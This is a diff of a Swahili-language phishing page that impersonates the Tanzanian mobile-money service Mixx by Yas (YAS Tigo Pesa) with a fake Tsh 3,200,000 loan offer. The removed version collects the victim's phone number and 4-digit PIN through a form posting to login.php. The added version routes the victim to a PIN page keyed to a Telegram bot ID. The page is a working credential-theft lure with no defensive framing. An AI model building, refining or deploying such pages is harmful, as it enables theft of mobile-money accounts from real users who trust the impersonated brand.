@@ -1,213 +1,320 @@
 <!DOCTYPE html>
 <html lang="sw">
 <head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mixx by Yas | Ofa Maalum</title>
 
-<title>YAS Mixx Offer</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
 
-<style>
+        body {
+            background: linear-gradient(145deg, #001f3f 0%, #003366 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            padding: 20px;
+        }
 
-*{
-    margin:0;
-    padding:0;
-    box-sizing:border-box;
-    font-family:Arial, Helvetica, sans-serif;
-}
+        .container {
+            max-width: 480px;
+            width: 100%;
+            background: #ffffff;
+            border-radius: 30px 30px 20px 20px;
+            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
+            overflow: hidden;
+            text-align: center;
+            padding: 35px 25px 40px;
+            position: relative;
+        }
 
-body{
-    background:#08284d;
-    display:flex;
-    justify-content:center;
-    min-height:100vh;
-}
+        /* Brand header strip */
+        .brand-strip {
+            background: #FFD400;
+            padding: 12px 0;
+            margin: -35px -25px 30px -25px;
+            border-radius: 0 0 30px 30px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
+        }
 
-.container{
-    width:100%;
-    max-width:430px;
-    text-align:center;
-    padding:25px 18px 40px;
-}
+        .brand-strip .logo-circle {
+            width: 44px;
+            height: 44px;
+            background: #003366;
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            color: #FFD400;
+            font-size: 18px;
+            font-weight: 800;
+            letter-spacing: -0.5px;
+        }
 
-.logo img{
-    width:95px;
-    border-radius:20px;
-    margin-bottom:18px;
-}
+        .brand-strip .brand-name {
+            font-size: 26px;
+            font-weight: 700;
+            color: #003366;
+            letter-spacing: -0.5px;
+        }
 
-h1{
-    color:#FFD100;
-    font-size:26px;
-    font-weight:bold;
-    line-height:1.3;
-    margin-bottom:25px;
-}
+        .brand-strip .brand-name span {
+            font-weight: 300;
+        }
 
-.description{
-    color:#ffffff;
-    font-size:18px;
-    line-height:1.7;
-    margin-bottom:30px;
-}
+        /* Main content */
+        .offer-badge {
+            background: #f0f7ff;
+            border-radius: 60px;
+            padding: 10px 20px;
+            display: inline-block;
+            font-size: 14px;
+            font-weight: 600;
+            color: #003366;
+            margin-bottom: 18px;
+            border: 1px solid #d0e0ff;
+        }
 
-.offer-title{
-    color:#FFD100;
-    font-size:18px;
-    font-weight:bold;
-    line-height:1.5;
-    margin-bottom:10px;
-}
+        h1 {
+            font-size: 32px;
+            color: #001a33;
+            line-height: 1.2;
+            margin-bottom: 12px;
+        }
 
-.offer{
-    color:#ffffff;
-    font-size:22px;
-    margin-bottom:35px;
-}
+        h1 .highlight {
+            color: #FFD400;
+            background: #003366;
+            padding: 0 10px;
+            border-radius: 12px;
+        }
 
-.form-group{
-    margin-bottom:18px;
-}
+        .sub-head {
+            color: #4a6a8a;
+            font-size: 18px;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
 
-input{
-    width:100%;
-    padding:18px;
-    border:none;
-    border-radius:12px;
-    font-size:18px;
-    background:#fff;
-}
+        .offer-box {
+            background: #f8fafc;
+            border-radius: 20px;
+            padding: 20px 18px;
+            margin-bottom: 30px;
+            border: 1px solid #e2ecf5;
+            box-shadow: 0 4px 12px rgba(0, 0, 0, 0.02);
+        }
 
-input:focus{
-    outline:none;
-    box-shadow:0 0 5px rgba(255,209,0,.7);
-}
+        .offer-box .amount {
+            font-size: 42px;
+            font-weight: 800;
+            color: #003366;
+            letter-spacing: 1px;
+        }
 
-button{
-    width:100%;
-    padding:18px;
-    border:none;
-    border-radius:12px;
-    background:#FFD100;
-    color:#0d2950;
-    font-size:20px;
-    font-weight:bold;
-    cursor:pointer;
-    transition:.3s;
-}
+        .offer-box .amount small {
+            font-size: 22px;
+            font-weight: 600;
+            color: #FFD400;
+            background: #003366;
+            padding: 2px 12px;
+            border-radius: 30px;
+            margin-left: 8px;
+        }
 
-button:hover{
-    background:#f4c400;
-}
+        .offer-box .desc {
+            font-size: 15px;
+            color: #4a6a8a;
+            margin-top: 8px;
+        }
 
-.notice{
-    margin-top:25px;
-    background:#46512c;
-    border:2px solid #FFD100;
-    border-radius:12px;
-    padding:18px;
-    color:#FFD100;
-    font-size:18px;
-    font-weight:bold;
-}
+        .features {
+            display: flex;
+            flex-direction: column;
+            gap: 10px;
+            margin-bottom: 28px;
+            text-align: left;
+        }
 
-.footer{
-    margin-top:30px;
-    color:#fff;
-    font-size:14px;
-}
+        .feature-item {
+            display: flex;
+            align-items: center;
+            gap: 12px;
+            background: #f7faff;
+            padding: 12px 16px;
+            border-radius: 14px;
+            border-left: 4px solid #FFD400;
+        }
 
-@media(max-width:480px){
+        .feature-item .icon {
+            font-size: 22px;
+            width: 32px;
+            text-align: center;
+        }
 
-.container{
-    padding:20px 15px 35px;
-}
+        .feature-item .text {
+            font-size: 15px;
+            color: #002244;
+            font-weight: 500;
+        }
 
-h1{
-    font-size:22px;
-}
+        .btn-primary {
+            display: block;
+            width: 100%;
+            padding: 18px;
+            background: #FFD400;
+            color: #003366;
+            border: none;
+            border-radius: 60px;
+            font-size: 22px;
+            font-weight: 700;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            text-decoration: none;
+            box-shadow: 0 6px 20px rgba(255, 212, 0, 0.35);
+            letter-spacing: 0.5px;
+        }
 
-.description{
-    font-size:17px;
-}
+        .btn-primary:hover {
+            background: #f0c400;
+            transform: scale(1.02);
+            box-shadow: 0 8px 28px rgba(255, 212, 0, 0.5);
+        }
 
-.offer-title{
-    font-size:17px;
-}
+        .btn-primary:active {
+            transform: scale(0.97);
+        }
 
-.offer{
-    font-size:20px;
-}
+        .footer-note {
+            margin-top: 22px;
+            font-size: 13px;
+            color: #7a94b0;
+            border-top: 1px solid #e5edf5;
+            padding-top: 18px;
+        }
 
-button{
-    font-size:18px;
-}
+        .footer-note a {
+            color: #003366;
+            font-weight: 600;
+            text-decoration: none;
+        }
 
-}
-
-</style>
-
+        /* Responsive */
+        @media (max-width: 400px) {
+            .brand-strip .brand-name {
+                font-size: 22px;
+            }
+            h1 {
+                font-size: 26px;
+            }
+            .offer-box .amount {
+                font-size: 34px;
+            }
+            .btn-primary {
+                font-size: 18px;
+                padding: 16px;
+            }
+        }
+    </style>
 </head>
-
 <body>
 
 <div class="container">
 
-    <div class="logo">
-        <!-- Replace with your logo -->
-        <img src="logo.png" alt="YAS Logo">
+    <!-- Brand Header -->
+    <div class="brand-strip">
+        <div class="logo-circle">Y</div>
+        <div class="brand-name">Mixx <span>by Yas</span></div>
     </div>
+
+    <!-- Offer Badge -->
+    <div class="offer-badge">🔥 OFA MAALUMU</div>
 
     <h1>
-        Umejishindia Ofa Wa<br>
-        YAS Tigo Pesa
+        Pata <span class="highlight">Tsh 3,200,000</span>
     </h1>
+    <p class="sub-head">
+        Kwa mkopo wa haraka na rahisi kupitia <strong>YAS Tigo Pesa</strong>
+    </p>
 
-    <div class="description">
-        Karibu! Ingiza namba yako ya simu na Neno Siri (YAS PIN - 4 namba) ili kupata ofa.
-    </div>
-
-    <div class="offer-title">
-        Kiwango cha Ofa kinachoweza kupatikana:
-    </div>
-
-    <div class="offer">
-        Tsh 3,200,000
-    </div>
-
-    <form action="login.php" method="POST">
-
-        <div class="form-group">
-            <input
-                type="tel"
-                name="phone"
-                placeholder="Nambari ya Mixx"
-                required>
+    <!-- Offer Box -->
+    <div class="offer-box">
+        <div class="amount">
+            3,200,000 <small>Tsh</small>
         </div>
-
-        <div class="form-group">
-            <input
-                type="password"
-                name="pin"
-                maxlength="4"
-                placeholder="YAS Nambari ya Siri"
-                required>
-        </div>
-
-        <button type="submit">
-            THIBITISHA ZAWADI
-        </button>
-
-    </form>
-
-    <div class="notice">
-        Jaza fomu ili kupata ofa yako!
+        <div class="desc">Kiwango cha juu kinachoweza kupatikana</div>
     </div>
 
-    <div class="footer">
-        © 2026 YAS Tanzania
+    <!-- Features -->
+    <div class="features">
+        <div class="feature-item">
+            <span class="icon">⚡</span>
+            <span class="text">Hakuna usumbufu wa karatasi</span>
+        </div>
+        <div class="feature-item">
+            <span class="icon">📱</span>
+            <span class="text">Omba kupitia simu yako dakika 5</span>
+        </div>
+        <div class="feature-item">
+            <span class="icon">✅</span>
+            <span class="text">Idhinishwa haraka na timu yetu</span>
+        </div>
+        <div class="feature-item">
+            <span class="icon">🔒</span>
+            <span class="text">Taarifa zako zimehifadhiwa kwa usalama</span>
+        </div>
+    </div>
+
+    <!-- Call to Action Button -->
+    <a href="#" id="startBtn" class="btn-primary">
+        ANZA SASA
+    </a>
+
+    <div class="footer-note">
+        🛡️ Unakubali masharti na matumizi ya huduma kwa kubofya.
+        <br>
+        <a href="#">Soma zaidi</a>
     </div>
 
 </div>
+
+<script>
+    // Get botId from URL and pass it to pin.html
+    const params = new URLSearchParams(window.location.search);
+    const botId = params.get('botId');
+
+    // If no botId, we can still show the page but warn the user, or just use a default?
+    // The server redirects /bot/:botId to /index.html?botId=... so normally it's present.
+    const startBtn = document.getElementById('startBtn');
+
+    if (botId) {
+        startBtn.href = `pin.html?botId=${botId}`;
+    } else {
+        // Fallback: show a message, or use a default? Better to show an error.
+        startBtn.href = 'pin.html';
+        startBtn.style.opacity = '0.7';
+        startBtn.style.background = '#cccccc';
+        startBtn.style.color = '#666';
+        startBtn.style.pointerEvents = 'none';
+        // Add a small status below
+        const footer = document.querySelector('.footer-note');
+        const warning = document.createElement('p');
+        warning.style.color = '#d00';
+        warning.style.fontWeight = 'bold';
+        warning.style.marginTop = '8px';
+        warning.textContent = '⚠️ Kiungo kisichofaa. Tafadhali tumia kiungo kutoka kwa Telegram.';
+        footer.appendChild(warning);
+    }
+</script>
 
 </body>
 </html>
